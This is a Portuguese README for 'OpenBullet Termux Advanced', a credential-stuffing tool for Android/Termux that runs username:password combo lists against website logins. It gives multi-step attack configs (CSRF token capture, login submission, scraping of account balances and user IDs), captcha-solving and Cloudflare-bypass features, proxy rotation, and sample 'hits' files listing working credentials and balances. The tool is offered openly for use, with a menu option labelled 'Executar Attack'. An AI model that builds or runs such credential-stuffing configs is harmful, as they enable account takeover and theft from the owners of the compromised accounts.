# OpenBullet Termux Advanced 🚀

**Versão avançada com Multi-Request, Captcha Solving, Cloudflare Bypass e Menu Interativo**

## 🔥 **Novidades da Versão Advanced:**

### 💫 **Multi-Request System**
- **Múltiplas requests em sequência** (login → captura dados → scraping)
- **Placeholders dinâmicos** entre steps (`<TOKEN>`, `<SESSION_ID>`, etc.)
- **Conditional execution** (steps opcionais vs obrigatórios)
- **Data capture automático** (tokens, saldos, IDs, etc.)

### 🧩 **Captcha Solving**
- **Manual input** via terminal
- **2captcha integration** (API ready)
- **Auto-detection** de reCAPTCHA v2/v3
- **Site key extraction** automático

### ☁️ **Cloudflare Bypass**
- **Headers otimizados** para bypass básico
- **User-Agent rotation**
- **Challenge detection** automático
- **Sec-Fetch headers** para mobile

### 🎨 **Menu Interativo**
- **Interface completa** via terminal
- **Templates prontos** (login, scraper, API, etc.)
- **Config builder** interativo
- **Estatísticas em tempo real**

### 📊 **Enhanced Capture System**
- **Regex capture** avançado
- **JSON path extraction**
- **Cross-step variables** 
- **Multi-format output** (TXT + JSON + Captures)

## 🚀 **Como Usar:**

### **1. Menu Interativo (Recomendado):**
```bash
python3 openbullet_advanced.py --menu
```

### **2. Modo CLI:**
```bash
python3 openbullet_advanced.py -w combos.txt -c config_multi_request.json
```

### **3. Criar Config Avançada:**
```bash
python3 openbullet_advanced.py --create-config
```

## 📋 **Exemplo de Config Multi-Request:**

```json
{
  "mode": "login",
  "request_steps": [
    {
      "name": "get_csrf_token",
      "url": "https://example.com/login",
      "method": "GET",
      "capture_regex": {
        "csrf_token": "name=\"csrf_token\" value=\"([^\"]+)\"",
        "session_id": "PHPSESSID=([^;]+)"
      },
      "required": true,
      "delay_after": 1.0
    },
    {
      "name": "submit_login",
      "url": "https://example.com/login",
      "method": "POST",
      "data": "username=<USER>&password=<PASS>&csrf_token=<CSRF_TOKEN>",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://example.com/login"
      },
      "success_strings": ["dashboard", "welcome"],
      "failure_strings": ["invalid", "error"],
      "required": true,
      "delay_after": 2.0
    },
    {
      "name": "get_balance",
      "url": "https://example.com/dashboard",
      "method": "GET",
      "capture_regex": {
        "balance": "Balance:\\s*\\$?([0-9,.]+)",
        "user_id": "user_id[\"\\s]*[:\\s]*[\"']?(\\d+)",
        "email": "email[\"\\s]*[:\\s]*[\"']([^\"']+)"
      },
      "required": false,
      "delay_after": 0.5
    }
  ],
  "captcha": {
    "enabled": true,
    "solver": "manual",
    "api_key": "your_2captcha_key"
  },
  "cloudflare": {
    "enabled": true
  },
  "settings": {
    "threads": 15,
    "timeout": 30,
    "delay": 0.2
  }
}
```

## 🎯 **Placeholders Avançados:**

### **Combo Data:**
- `<USER>` / `<EMAIL>` - Username/email
- `<PASS>` / `<PASSWORD>` - Senha

### **Captured Data (entre steps):**
- `<CSRF_TOKEN>` - Token CSRF capturado
- `<SESSION_ID>` - Session ID capturado
- `<BALANCE>` - Saldo capturado
- `<USER_ID>` - ID do usuário capturado
- `<TOKEN>` - Token de API capturado

## 📊 **Output Avançado:**

### **Durante execução:**
```
[INFO] [12:34:56] Starting OpenBullet Advanced Attack
[INFO] [12:34:56] Mode: login
[INFO] [12:34:56] Steps: 3
[INFO] [12:34:56] Captcha: Enabled
[INFO] [12:34:56] Cloudflare: Enabled

[DEBUG] [12:34:57] Executing step: get_csrf_token
[CAPTURE] [12:34:58] csrf_token: abc123def456
[CAPTURE] [12:34:58] session_id: PHPSESSID=xyz789

[DEBUG] [12:34:59] Executing step: submit_login
[HIT] [12:35:01] HIT: user@example.com:password | Captured: csrf_token:abc123, balance:$150.50 | Time: 3.2s

[DEBUG] [12:35:02] Executing step: get_balance
[CAPTURE] [12:35:03] balance: 150.50
[CAPTURE] [12:35:03] user_id: 12345
```

### **Arquivos salvos:**
- `hits_20241208_123456.txt` - Hits básicos
- `hits_detailed_20241208_123456.json` - Hits com metadados
- `captures_20241208_123456.txt` - Dados capturados organizados

## 🎨 **Menu Interativo:**

```
╔══════════════════════════════════════════════════════════════╗
║                 OpenBullet Termux Advanced                   ║
║              Multi-Request • Captcha • Cloudflare           ║
║                     Desenvolvido para Termux                ║
╚══════════════════════════════════════════════════════════════╝

============================================================
                    MENU PRINCIPAL
============================================================
1. 🚀 Executar Attack (Carregar config)
2. ⚙️  Criar Config Nova
3. 📝 Editar Config Existente
4. 🎯 Modo Scraper
5. 📊 Ver Estatísticas de Sessão
6. 🔧 Configurações Avançadas
7. ❓ Ajuda
0. 🚪 Sair
============================================================
```

## 🛠️ **Templates Disponíveis:**

1. **🔐 Login Simples** - Single request básico
2. **🔄 Login + Captura** - Multi-request com capture
3. **🛒 E-commerce** - Login de loja online
4. **🌐 API REST** - Integração com APIs
5. **🕸️ Site com Captcha** - Com captcha solving
6. **☁️ Site com Cloudflare** - Com CF bypass
7. **📊 Scraper** - Extração de dados sem login
8. **🎨 Customizado** - Config manual completa

## 🔧 **Modo Scraper:**

Para sites que não precisam de login, só extração de dados:

```json
{
  "mode": "scraper",
  "request_steps": [
    {
      "name": "get_product_page",
      "url": "https://store.com/product/<USER>",
      "method": "GET",
      "capture_regex": {
        "price": "price[\"\\s]*[:\\s]*[\"']?\\$?([0-9,.]+)",
        "stock": "stock[\"\\s]*[:\\s]*[\"']?(\\d+)",
        "title": "<title>([^<]+)</title>"
      },
      "required": true
    }
  ]
}
```

## 🚨 **Captcha Manual:**

Quando detectado, o sistema pausa e pede input:

```
[WARN] [12:34:56] CAPTCHA detected on https://example.com/login
[INFO] [12:34:56] Site Key: 6Lc2fhwTAAAAAGjd...
[INFO] [12:34:56] Please solve the captcha manually and paste the response token:
Captcha Token: 03AGdBq27HkS8_T9s...

[CAPTURE] [12:34:58] Captcha solved: 03AGdBq27HkS8_T9s...
```

## 🌐 **Cloudflare Bypass:**

Headers otimizados para dispositivos móveis:

```json
{
  "cloudflare": {
    "enabled": true
  }
}
```

Automaticamente adiciona:
- **User-Agent rotation** (mobile)
- **Sec-Fetch headers**
- **DNT + Cache-Control**
- **Detection automático** de challenges

## 📈 **Performance Otimizada:**

- **Threads dinâmicos** baseados na wordlist
- **Memory management** para captures grandes
- **Request pooling** para múltiplas steps
- **Timeout inteligente** por step
- **Proxy rotation** aprimorada

## 💾 **Arquivos de Output:**

### **hits_20241208_123456.txt:**
```
user1@example.com:password123
admin@site.com:admin123
test@gmail.com:test123
```

### **captures_20241208_123456.txt:**
```
=== user1@example.com:password123 ===
csrf_token: abc123def456
session_id: PHPSESSID=xyz789
balance: 150.50
user_id: 12345
email_verified: true

=== admin@site.com:admin123 ===
csrf_token: def456ghi789
balance: 2500.00
user_id: 1
admin_level: 5
```

## 🔥 **Casos de Uso Avançados:**

### **1. E-commerce com 2FA:**
```json
{
  "request_steps": [
    {"name": "login", "capture_regex": {"token": "..."}},
    {"name": "get_2fa", "capture_regex": {"code": "..."}},
    {"name": "submit_2fa", "data": "code=<CODE>"},
    {"name": "get_orders", "capture_regex": {"total": "..."}}
  ]
}
```

### **2. API com Rate Limiting:**
```json
{
  "settings": {
    "threads": 5,
    "delay": 2.0,
    "timeout": 60
  }
}
```

### **3. Scraper de Produtos:**
```json
{
  "mode": "scraper",
  "request_steps": [
    {
      "name": "search_product",
      "url": "https://store.com/search?q=<USER>",
      "capture_regex": {
        "price": "\\$([0-9,.]+)",
        "rating": "rating[\"\\s]*[:\\s]*([0-9.]+)"
      }
    }
  ]
}
```

## ⚠️ **Requisitos:**

- **Python 3.10+**
- **Termux (Android)** ou Linux
- **0 dependências externas**
- **~5MB de storage**
- **<100MB RAM** em uso

## 🎯 **Próximas Features:**

- [ ] **OCR Captcha** integration
- [ ] **Proxy health check** automático
- [ ] **Config editor** visual
- [ ] **Database export** (SQLite)
- [ ] **API server** mode
- [ ] **Docker support**

---

**🚀 Desenvolvido especialmente para a comunidade Mobile/Termux**

**Version 2.0 Advanced - Agora com Multi-Request Power! 💪**